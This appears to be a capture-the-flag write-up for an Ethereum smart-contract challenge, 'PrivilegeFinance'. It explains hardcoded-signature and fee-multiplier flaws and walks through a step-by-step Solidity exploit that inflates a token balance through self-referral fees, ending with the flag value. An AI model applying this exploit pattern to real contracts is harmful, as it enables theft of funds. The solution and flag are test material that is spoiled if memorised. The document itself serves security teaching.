# Challenge 07: PrivilegeFinance - Signature Exploitation & Fee Manipulation

## 🎯 Challenge Goal

Raise the token balance of `msg.sender` to at least **10,000,000** tokens.

## 📋 Difficulty

**Expert** ⭐⭐⭐⭐⭐

## 🔍 Vulnerability Overview

The PrivilegeFinance contract contains multiple interconnected vulnerabilities:

### 1. **Signature Validation Weakness**
The `DynamicRew()` function uses ECDSA recovery with hardcoded r, s, v values. The message sender address is provided as a parameter and bruteforceable.

### 2. **Unchecked Parameter Setting**
The `ReferrerFees` and `transferRate` can be set to arbitrary high values (up to 2,000,000 and 50 respectively).

### 3. **Fee Distribution Vulnerability**
When `transfer()` is called with `recipient == admin`, the contract calculates:
```solidity
_fee = amount * transferRate / 100;
_transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
```

This allows massive token transfers from the contract to referrers when fees are high.

## 💡 Exploit Strategy

### Step 1: Brute-force the Correct Address
The `msgsender` string is malformed (39 bytes instead of 20). Brute-forcing reveals:
```
Correct: 0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053
```

### Step 2: Call DynamicRew with Crafted Parameters
```solidity
finance.DynamicRew(
    0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053,  // bruteforced address
    1677729609,                                     // timestamp = time + 2
    20000000 / 1000 * 100,                          // ReferrerFees = 2,000,000
    50                                              // transferRate = 50
);
```

This satisfies:
- `_blocktimestamp < 1677729610` ✓
- `_transferRate <= 50` ✓
- `ecrecover()` validates against hardcoded r, s, v ✓

### Step 3: Get Initial Tokens
```solidity
finance.Airdrop();  // Gives 1000 tokens
```

### Step 4: Set Referrer
```solidity
finance.deposit(address(0), 1, msg.sender);
```

This sets `referrers[msg.sender] = msg.sender` (the external caller).

### Step 5: Trigger Fee Distribution
```solidity
finance.transfer(finance.admin(), 999);
```

When recipient is admin:
- `_fee = 999 * 50 / 100 = 499`
- To referrer: `499 * 2,000,000 / 50 = 19,960,000` ✓

This massive transfer goes to the referrer (msg.sender).

### Step 6: Set Flag
```solidity
finance.setflag();  // Sets flag = true if balance > 10,000,000
```

## 🛡️ Key Insights

1. **The caller matters**: `msg.sender` in `deposit()` determines who receives the referrer fees
2. **Parameter amplification**: `ReferrerFees` multiplier and fee calculation create exponential growth
3. **Referrer targeting**: The contract transfers to `referrers[msg.sender]`, allowing self-referral
4. **Supply abundance**: With 200B initial tokens in the contract, massive transfers are feasible

## 🧪 Testing

```bash
# Run all PrivilegeFinance tests
make test-privilegefinance

# Test exploit specifically
make test-privilegefinance-exploit

# Test complete challenge solution
make test-privilegefinance-solve

# Verbose testing
make test-privilegefinance-verbose
```

## 📝 Files

- `src/contracts/PrivilegeFinance.sol` - Challenge contract (unmodified)
- `src/contracts/PrivilegeFinanceExploit.sol` - Exploit implementation
- `test/PrivilegeFinance.t.sol` - Test suite

## 🔐 Security Implications

This challenge demonstrates:
- ✗ Hardcoded cryptographic values are exploitable
- ✗ Parameter validation must be strict and consistent
- ✗ Fee calculations can be weaponized when multipliers are user-controlled
- ✗ Referral systems require protection against self-referral exploitation

## 📚 References

- EVM Opcode Reference
- Solidity ABI Encoding
- ECDSA Signature Recovery
- Storage Slot Calculations

---

**Flag**: `0x4c7d8e17af758ca2054f6c1c6ea4535387352aeb`
